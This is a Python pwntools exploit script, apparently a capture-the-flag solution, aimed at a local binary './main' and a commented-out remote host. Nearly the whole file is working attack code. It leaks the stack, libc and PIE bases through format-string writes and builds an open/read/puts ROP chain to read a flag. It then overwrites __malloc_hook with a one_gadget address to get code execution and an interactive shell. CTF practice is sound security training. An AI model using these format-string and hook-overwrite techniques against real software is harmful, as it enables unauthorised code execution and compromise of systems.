from pwn import*
#context.log_level = 'DEBUG'
while True:
	p = process('./main',timeout=0.5)
#	p = remote('183.129.189.62',61405)
	elf =ELF('./main')
	libc =ELF('./libc-2.23.so')

	try:
		p.recvuntil('gift : ')
		stack = int(p.recv(14),16)

		if stack&0xFFFF > 0x2000:
			p.close
			continue
		log.info('Stack:\t' + hex(stack))
		p.sendline('\x00'*0x50 + './flag\n')
		p.sendline('%' + str((stack  -0xC)&0xFFFF) + 'c%11$hn')
		p.sendline('%1968c%37$hn')
		sleep(0.02)
		def w(off,byte):
			if ord(byte):
				p.sendline('%' + str((stack + off)&0xFFFF) + 'c%10$hn')
				p.sendline('%' + str(ord(byte)) + 'c%36$hhn')
			else:
				p.sendline('%' + str((stack + off)&0xFFFF) + 'c%10$hn')
				p.sendline('%36$hn')
			sleep(0.05)
#		gdb.attach(p,"set *(size_t*)0x7fffffffdf18=0x5555555547B0")
		w(-0x54,'\x90')
		p.sendline('%2c%26$n')
		
		p.sendline('LIBC:%9$pPIE:%8$p\x00')
		p.recvuntil('LIBC:')
		libc_base = int(p.recv(14),16) - 240 -libc.sym['__libc_start_main']
		log.info('LIBC:\t' + hex(libc_base))
		
		p.recvuntil('PIE:')
		proc_base = int(p.recv(14,timeout=0.5),16) -0x990
		log.info('Proc:\t' +hex(proc_base))
		
		pop_rdi_ret = libc_base + 0x0000000000021112
		pop_rsi_ret = libc_base + 0x00000000000202F8
		pop_rdx_ret = libc_base + 0x0000000000001B92
		Open = libc_base + libc.sym['open']
		Read = libc_base + libc.sym['read']
		Puts = libc_base + libc.sym['puts']
		
		ORW  = p64(pop_rdi_ret) + p64(proc_base + 0x201040 + 0x50) + p64(pop_rsi_ret) + p64(0) + p64(Open)
		ORW += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(proc_base + elf.bss() + 0x100) + p64(pop_rdx_ret) + p64(0x30) + p64(Read)
		ORW += p64(pop_rdi_ret) + p64(proc_base + elf.bss() + 0x100) + p64(Puts)
		#for i in range(len(ORW)):
		#	w(-0xDC + i,ORW[i])
		mhook = p64(libc_base + libc.sym['__malloc_hook'])
		rce = p64(libc_base + 0xF1207)
		for i in range(3,-1,-1):
			w(-0xDC + i,mhook[i])
		sleep(3)
		for i in range(4):
			w(-0xDC,chr(ord(mhook[0]) + i))
			p.sendline('%' + str(ord(rce[i])) + 'c%9$hhn')
			sleep(0.05)
		p.sendline('%99999c%10$n')
		break
	except:
		p.close()
		continue
os.system("rm core")
p.interactive()
